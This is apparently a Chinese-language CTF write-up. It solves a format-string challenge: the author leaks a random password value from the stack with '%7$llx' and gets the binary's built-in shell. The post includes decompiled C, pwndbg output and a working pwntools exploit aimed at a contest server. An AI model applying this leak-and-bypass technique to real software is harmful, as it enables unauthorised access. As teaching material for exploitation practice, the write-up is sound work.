---
title: 'write的小巧思'
published: 2026-09-10
description: '你怎么知道我又来拉屎了'
author: 'dxfaker'
image: '/images/post/1dfec58f-abdf-453c-b237-db6e8ed237d6.png'
tags: ['pwn','wp']
category: 'wp'
toc: true
---

# 写在前面

这个是25新生赛的题，一开始我以为UAF，但是后面发现他只用了堆，然后就以为可以通过格式化字符串漏洞来打，再到后面发现我又错了，看来还得练啊

# 正文

```c
int __fastcall __noreturn main(int argc, const char **argv, const char **envp)
{
  __int64 v3; // [rsp+0h] [rbp-20h] BYREF
  __int64 buf; // [rsp+8h] [rbp-18h] BYREF
  char *format; // [rsp+10h] [rbp-10h]
  int fd; // [rsp+1Ch] [rbp-4h]

  init(argc, argv, envp);
  buf = 0;
  v3 = 0;
  fd = open("/dev/urandom", 0);
  if ( fd < 0 )
  {
    perror("Failed to open /dev/urandom");
    exit(-1);
  }
  read(fd, &buf, 8u);
  close(fd);
  format = (char *)malloc(0x100u);
  printf("User name: ");
  __isoc99_scanf("%255s", format);
  puts("Hello, ");
  printf(format);
  printf("\nPassword: ");
  __isoc99_scanf("%lld", &v3);
  if ( v3 == buf )
  {
    puts("Login successful!");
    system("/bin/sh");
  }
  else
  {
    puts("Login failed!");
  }
  free(format);
  exit(0);
}
```

先看main函数逻辑

省流:开了一个文件读了一串字节，然后进行对比，相同就可以直接get shell

可是现在的问题是我哪知道他读的是哪里的文件，然后是有一个输入format存储到堆上的操作

然后checksec

```bash
  Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
    Stripped:   No
```

只开了NX

那就看向唯一能操作的地方

```c
 format = (char *)malloc(0x100u);
  printf("User name: ");
  __isoc99_scanf("%255s", format);
  puts("Hello, ");
  printf(format);
```

复习一下printf操作

| `%d` / `%i` | 有符号十进制整数                     |
| ----------- | ------------------------------------ |
| `%u`        | 无符号十进制整数                     |
| `%x` / `%X` | 十六进制整数                         |
| `%p`        | 指针地址（十六进制）                 |
| `%s`        | 字符串（从参数指向的地址读取）       |
| `%c`        | 字符                                 |
| `%n`        | **将已打印字符数写入参数指向的地址** |
| `%hhn`      | 写 1 字节                            |
| `%hn`       | 写 2 字节                            |
| `%ln`       | 写 8 字节                            |

以及经典的格式化字符串漏洞

buf可以输入%p%s%n,以达到信息泄露以及任意内存写的操作

而且你看栈布局

```c
__int64 v3;    // [rsp+0h]  [rbp-20h]
__int64 buf;   // [rsp+8h]  [rbp-18h]
char *format;  // [rsp+10h] [rbp-10h]

```

format紧接着要对比的buf以及v3

再回顾printf的操作中可以读定向操作的%s,那我是不是可以尝试一下把buf的数据读出来，那不就可以在下一次输入的时候使其相同，那不就结束战斗了

不开tmux

```bash
pwndbg> break *0x4012da
Breakpoint 1 at 0x4012da
pwndbg> run < in.txt
Starting program: /mnt/d/ctf/flag/pwn/aurora25/guess v2.0/guess2 < in.txt
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
User name: Hello,

Breakpoint 1, 0x00000000004012da in main ()

LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA
─────────────────────────────────[ REGISTERS / show-flags off / show-compact-regs off ]─────────────────────────────────
 RAX  0
 RBX  0x7fffffffd9f8 —▸ 0x7fffffffdcfd ◂— '/mnt/d/ctf/flag/pwn/aurora25/guess v2.0/guess2'
 RCX  0x7ffff7d1c6a4 (write+20) ◂— cmp rax, -0x1000 /* 'H=' */
 RDX  0
 RDI  0x4052a0 ◂— 0x786c6c243725 /* '%7$llx' */
 RSI  0x7ffff7e04643 (_IO_2_1_stdout_+131) ◂— 0xe05710000000000a /* '\n' */
 R8   7
 R9   0xff
 R10  0x7ffff7c0abe8 ◂— 0x11002200006cb5
 R11  0x202
 R12  1
 R13  0
 R14  0x403e00 (__do_global_dtors_aux_fini_array_entry) —▸ 0x4011a0 (__do_global_dtors_aux) ◂— endbr64
 R15  0x7ffff7ffd000 (_rtld_global) —▸ 0x7ffff7ffe2e0 ◂— 0
 RBP  0x7fffffffd8d0 —▸ 0x7fffffffd970 —▸ 0x7fffffffd9d0 ◂— 0
 RSP  0x7fffffffd8b0 ◂— 0
 RIP  0x4012da (main+213) ◂— call printf@plt
──────────────────────────────────────────[ DISASM / x86-64 / set emulate on ]──────────────────────────────────────────
b► 0x4012da <main+213>    call   printf@plt                  <printf@plt>

   0x4012df <main+218>    lea    rax, [rip + 0xd61]     RAX => 0x402047 ◂— '\nPassword: '
   0x4012e6 <main+225>    mov    rdi, rax               RDI => 0x402047 ◂— '\nPassword: '
   0x4012e9 <main+228>    mov    eax, 0                 EAX => 0
   0x4012ee <main+233>    call   printf@plt                  <printf@plt>

   0x4012f3 <main+238>    lea    rax, [rbp - 0x20]
   0x4012f7 <main+242>    mov    rsi, rax
   0x4012fa <main+245>    lea    rax, [rip + 0xd52]     RAX => 0x402053 ◂— 0x676f4c00646c6c25 /* '%lld' */
   0x401301 <main+252>    mov    rdi, rax               RDI => 0x402053 ◂— 0x676f4c00646c6c25 /* '%lld' */
   0x401304 <main+255>    mov    eax, 0                 EAX => 0
   0x401309 <main+260>    call   __isoc99_scanf@plt          <__isoc99_scanf@plt>
───────────────────────────────────────────────────────[ STACK ]────────────────────────────────────────────────────────
00:0000│ rsp 0x7fffffffd8b0 ◂— 0
01:0008│-018 0x7fffffffd8b8 ◂— 0x710900f23a7475a1
02:0010│-010 0x7fffffffd8c0 —▸ 0x4052a0 ◂— 0x786c6c243725 /* '%7$llx' */
03:0018│-008 0x7fffffffd8c8 ◂— 0x3ffffd9f8
04:0020│ rbp 0x7fffffffd8d0 —▸ 0x7fffffffd970 —▸ 0x7fffffffd9d0 ◂— 0
05:0028│+008 0x7fffffffd8d8 —▸ 0x7ffff7c2a1ca (__libc_start_call_main+122) ◂— mov edi, eax
06:0030│+010 0x7fffffffd8e0 —▸ 0x7fffffffd920 —▸ 0x403e00 (__do_global_dtors_aux_fini_array_entry) —▸ 0x4011a0 (__do_global_dtors_aux) ◂— endbr64
07:0038│+018 0x7fffffffd8e8 —▸ 0x7fffffffd9f8 —▸ 0x7fffffffdcfd ◂— '/mnt/d/ctf/flag/pwn/aurora25/guess v2.0/guess2'
─────────────────────────────────────────────────────[ BACKTRACE ]──────────────────────────────────────────────────────
 ► 0 0x4012da       main+213
   1 0x7ffff7c2a1ca __libc_start_call_main+122
   2 0x7ffff7c2a28b __libc_start_main+139
   3 0x401111       _start+33
pwndbg>


```

可以看到rbp的-8-10-18

fmtdump / fmtarg：栈上的第 N 格"直接翻译成"printf 的第 %N$ 个参数

```bash
pwndbg> fmtdump 8
%-6$  0x0000000000000000 #v3
%-7$  0x710900f23a7475a1 #buf
%-8$  0x00000000004052a0 #format
%-9$  0x00000003ffffd9f8
%-10$  0x00007fffffffd970
%-11$  0x00007ffff7c2a1ca
%-12$  0x00007fffffffd920
%-13$  0x00007fffffffd9f8
```

x86-64 下第 1~5 个变参走 rsi/rdx/rcx/r8/r9,第 6 个起走栈, 也就是调用者 rsp+0 / rsp+8 / ...:

所以就可以动手写exp了

```python
from pwn import *

context(arch='amd64', os='linux', log_level='info')

LOCAL = True      
HOST, PORT = 'node.szu.moe', 10053

elf = ELF('./guess2')


def u64s(x):
    return x - (1 << 64) if x >= (1 << 63) else x


def main():
    io = process(elf.path) if LOCAL else remote(HOST, PORT)

    io.sendlineafter(b'User name: ', b'%7$llx')
    io.recvuntil(b'Hello, \n')
    buf = u64s(int(io.recvuntil(b'\n', drop=True).strip(), 16))

    io.sendlineafter(b'Password: ', str(buf).encode())

    io.interactive()


if __name__ == '__main__':
    main()
```

>把 64 位无符号整数转成有符号：
>
>若最高位为 1（x >= 2^63），减去 2^64 变成负数
>否则原样返回
>为什么必须做：printf("%llx") 把随机数按无符号打印（如 14346747841414464070），而 scanf("%lld") 是有符号解析，最大只接受 9223372036854775807。直接发会解析溢出 → v3 != buf → 登录失败。
>
>随机数最高位为 1 的概率是 50%，所以这函数直接决定成功率是 50% 还是 100%。

